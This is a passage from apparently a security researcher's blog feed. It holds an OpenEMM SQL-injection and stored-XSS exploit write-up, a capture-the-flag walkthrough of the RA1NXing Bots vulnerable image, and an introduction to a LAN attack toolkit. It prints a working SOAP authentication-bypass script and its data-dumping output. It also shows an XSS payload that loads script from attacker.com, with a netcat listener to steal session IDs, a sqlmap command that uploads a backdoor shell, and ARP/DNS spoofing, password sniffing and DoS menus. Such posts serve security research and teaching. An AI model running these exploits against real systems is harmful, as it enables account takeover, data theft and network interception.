<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>

<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
</span><span class='line'>        boolean result=false;
</span><span class='line'>        Connection dbConn=this.getConnection(msct);
</span><span class='line'>        Statement agnStatement=null;
</span><span class='line'>        ResultSet rset=null;
</span><span class='line'>        
</span><span class='line'>        try {
</span><span class='line'>            agnStatement=dbConn.createStatement();
</span><span class='line'>            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
</span><span class='line'>            if(rset!=null && rset.next()) {
</span><span class='line'>                result=true;
</span><span class='line'>            } else {
</span><span class='line'>                result=false;
</span><span class='line'>                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
</span><span class='line'>                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>


<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>

<p>The following code will bypass SOAP authentication and add a new mailing list:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from SOAPpy import WSDL
</span><span class='line'>
</span><span class='line'>wsdl_file = "./ws.wsdl"
</span><span class='line'>sploit = "\\' OR 1=1;-- "
</span><span class='line'>
</span><span class='line'>_server = WSDL.Proxy(wsdl_file)
</span><span class='line'>ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
</span><span class='line'>if ret &gt; 0:
</span><span class='line'>    print 'success (%d)'%ret</span></code></pre></td></tr></table></div></figure>


<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -h
</span><span class='line'>usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help  show this help message and exit
</span><span class='line'>  -i HOST     server address
</span><span class='line'>  -s          fetch all subscribers
</span><span class='line'>  -m MLIST    create new mailing list (XSS)
</span><span class='line'>  --dm        delete all mailing lists
</span><span class='line'>  --ds        delete all subscribers
</span><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30449464&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30446728&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
</span><span class='line'>[!] Discovered 2 subscribers
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>

<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select user();
</span><span class='line'>+-------------------+
</span><span class='line'>| user()            |
</span><span class='line'>+-------------------+
</span><span class='line'>| agnitas@localhost |
</span><span class='line'>+-------------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; show grants;
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| Grants for agnitas@localhost                                                                                                                       |
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>3 rows in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>

<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
</span><span class='line'>[!] Description field vulnerable to stored xss!
</span><span class='line'>[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
</span><span class='line'>[!] Saved successfully
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg"></p>

<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# nc -l -p 80
</span><span class='line'>GET / HTTP/1.1
</span><span class='line'>Host: 192.168.1.147
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
</span><span class='line'>Accept: */*
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
</span><span class='line'>Connection: keep-alive
</span><span class='line'>
</span><span class='line'>^C
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>

<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
    <updated>2013-07-10T23:31:29-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches&#8217; interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>

<p>As such, the iconic nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198
</span><span class='line'>Nmap scan report for 192.168.1.198
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>Not shown: 65531 closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
</span><span class='line'>|_2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
</span><span class='line'>80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
</span><span class='line'>| http-title: Site doesn't have a title (text/html).
</span><span class='line'>|_Requested resource was /index.php?page=main
</span><span class='line'>111/tcp  open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|_  100000  2,3,4        111/udp  rpcbind
</span><span class='line'>6667/tcp open  irc     IRCnet ircd
</span><span class='line'>| irc-info: Server: irc.localhost
</span><span class='line'>| Version: 2.11.2p2. irc.localhost 000A
</span><span class='line'>| Lservers/Lusers: 0/3
</span><span class='line'>| Uptime: 0 days, 0:10:37
</span><span class='line'>| Source host: 192.168.1.147
</span><span class='line'>|_Source ident: NONE or BLOCKED
</span><span class='line'>MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
</span><span class='line'>Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 - 2.6.35 (97%), Linux 2.6.32 - 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 - 2.6.36 (96%), Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 - 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 - 2.6.32 (94%)
</span><span class='line'>No exact OS matches for host (test conditions non-ideal).
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.44 ms 192.168.1.198
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'># Nmap done at Mon Jul  8 02:08:52 2013 -- 1 IP address (1 host up) scanned in 23.34 seconds</span></code></pre></td></tr></table></div></figure>


<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg"></p>

<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&password=blah' -p user --os-shell
</span><span class='line'>[....]
</span><span class='line'>[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
</span><span class='line'>[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
</span><span class='line'>[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
</span><span class='line'>os-shell&gt; whoami
</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] a
</span><span class='line'>command standard output:    'www-data'
</span><span class='line'>os-shell&gt; </span></code></pre></td></tr></table></div></figure>


<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>

<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$servers        = "127.0.0.1";
</span><span class='line'>$ports            = "6667";
</span><span class='line'>$admins            = "";
</span><span class='line'>$channels        = "#somechannel";
</span><span class='line'>$realnames         = "jhl";
</span><span class='line'>$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
</span><span class='line'>$chanpass     = "trolol";</span></code></pre></td></tr></table></div></figure>


<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>

<p><img class="center" src="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg"></p>

<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>

<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   while(!$SOCKET && ($try &lt;= $maxtryconn)){
</span><span class='line'>        $server = random($servers);
</span><span class='line'>        $port     = random($ports);
</span><span class='line'>        $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
</span><span class='line'>        $GLOBALS['SOCKET']=$SOCKET;
</span><span class='line'>        $try++;
</span><span class='line'>        sleep(1);
</span><span class='line'>    }
</span><span class='line'>    if(!$SOCKET) die("Cannot connect to remote host");
</span><span class='line'>    if ($SOCKET){
</span><span class='line'>        $GLOBALS['ident']     = $ident    = random($nicknames);
</span><span class='line'>        $GLOBALS['nick']     = $nick     = random($nicknames);
</span><span class='line'>        $GLOBALS['realname']= $realname    = random($realnames);
</span><span class='line'>        SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
</span><span class='line'>        NICK($nick);
</span><span class='line'>        print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
</span><span class='line'>        flush();sleep(1);
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }
</span><span class='line'>    if($pubcalled){
</span><span class='line'>        if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
</span><span class='line'>            if(function_exists($pubcmd)){
</span><span class='line'>                $sender = "PRIVMSG ".$dropMsg." "._;
</span><span class='line'>                $GLOBALS['sender'] = $sender;
</span><span class='line'>                $arg = str_replace("\r","",$arg);
</span><span class='line'>                $arg = str_replace("\n","",$arg);
</span><span class='line'>                $pubcmd($arg);
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>

<p><img class="center" src="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg"></p>

<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[introducing zarp]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/02/introducing-zarp/"/>
    <updated>2013-07-02T23:37:15-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/02/introducing-zarp</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been quietly developing a local network attack tool for quite a while now, and it&rsquo;s approaching a state I deem &lsquo;presentable&rsquo;.  Bugs are still being ironed out, and tons of features are still planned, but I&rsquo;ve gotten some great feedback over the past few months and decided it was time for an official introductory post.  This post serves as an introduction into the current capabilities of the framework, as well as a timeline for future development and goals.</p>

<p><a href="https://github.com/hatRiot/zarp">zarp</a> is a local network attack toolkit that emphasizes absolute control over local networks.  It&rsquo;s end goal is to provide a very clean, modular, well-defined interface into a network, handing absolute control over to the user.  Over the course of several months, I discovered myself having to harness one too many tools to perform very basic, and what should be, simple network exploitation.  Mind you, zarp is not about exploiting hosts.  It is merely about the manipulation of any and all traffic present on the local network, and allowing the user the ability to view it, manipulate it, and save it in any manner they desire.  I would align zarp more with Ettercap than Metasploit.</p>

<p>zarp is written in Python and makes an attempt to be as modular as possible while maintaining a high level of independence.  As of now, three things are required to run zarp: Python 2.7.x, Linux, and Scapy.  Because of Scapy&rsquo;s age, I&rsquo;ve had to modify the source code explicitly for zarp, and thus Scapy comes packaged with zarp.  I&rsquo;m currently working to replace Scapy entirely and move to Python 3, but this won&rsquo;t be for awhile.  Zarp modules are dynamically loaded at runtime, and a very basic, but useable, interface has been defined.  It is incredibly easy to write a zarp module and get them loaded up into the framework.</p>

<p>zarp&rsquo;s predominant interface is a CLI-driven GUI, as shown:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py 
</span><span class='line'>[!] Loaded 35 modules.
</span><span class='line'>     ____   __   ____  ____
</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
</span><span class='line'>     / _/ /    \ )   / ) __/
</span><span class='line'>    (____)\_/\_/(__\_)(__)
</span><span class='line'>        [Version 0.1.3]            
</span><span class='line'>    [1] Poisoners        [5] Parameter
</span><span class='line'>    [2] DoS Attacks      [6] Services 
</span><span class='line'>    [3] Sniffers         [7] Sessions 
</span><span class='line'>    [4] Scanners   
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>


<p>Each module is loaded into one of six buckets.  These buckets define the traits of the module and its intended use.  Sessions [7] are how sessions are managed.  Zarp allows a user to poison, sniff, and scan as many hosts as your system allows.  This means that all of your network poisoning and sniffing can be performed all in one spot.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; 0 7
</span><span class='line'>    [Running sessions]
</span><span class='line'>[1] ARP Spoof
</span><span class='line'>    [0] 192.168.1.219
</span><span class='line'>    [1] 192.168.1.49
</span><span class='line'>[2] Password Sniffer
</span><span class='line'>    [0] 192.168.1.49
</span><span class='line'>    |--&gt; Logging to  /tmp/passwords_49.txt
</span><span class='line'>[3] HTTP Server
</span><span class='line'>    [0] HTTP Server
</span><span class='line'>[4] DNS Spoof
</span><span class='line'>    [0] 192.168.1.219
</span><span class='line'>    |-&gt; [0] facebook.* -&gt; 192.168.1.42
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    [1] Stop session
</span><span class='line'>    [2] View session
</span><span class='line'>    [3] Start session logger
</span><span class='line'>    [4] Stop session logger
</span><span class='line'>
</span><span class='line'>0) </span></code></pre></td></tr></table></div></figure>


<p>As shown, many sessions can be managed from this interface at once.  Each module defines how output is displayed when the user is &lsquo;viewing&rsquo; the session; it could be network traffic, passwords, HTTP requests, and more.  Various sniffers built in allow easy parsing and logging.</p>

<p>Below are some of the built-in modules.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____   __   ____  ____
</span><span class='line'>(__  ) / _\ (  _ \(  _ '
</span><span class='line'> / _/ /    \ )   / ) __/
</span><span class='line'>(____)\_/\_/(__\_)(__)
</span><span class='line'>    [Version 0.1.3]            
</span><span class='line'>[1] Poisoners        [5] Parameter
</span><span class='line'>[2] DoS Attacks      [6] Services 
</span><span class='line'>[3] Sniffers         [7] Sessions 
</span><span class='line'>[4] Scanners   
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; 1
</span><span class='line'>[1] ARP Spoof
</span><span class='line'>[2] DNS Spoof
</span><span class='line'>[3] DHCP Spoof
</span><span class='line'>[4] NBNS Poison
</span><span class='line'>[5] LLMNR Spoofer
</span><span class='line'>[6] ICMP Redirection
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; 0 2
</span><span class='line'> ____   __   ____  ____
</span><span class='line'>(__  ) / _\ (  _ \(  _ '
</span><span class='line'> / _/ /    \ )   / ) __/
</span><span class='line'>(____)\_/\_/(__\_)(__)
</span><span class='line'>    [Version 0.1.3]            
</span><span class='line'>[1] DHCP Starvation
</span><span class='line'>[2] LAND DoS
</span><span class='line'>[3] IPv6 Neighbor Discovery Protocol RA DoS
</span><span class='line'>[4] Nestea DoS
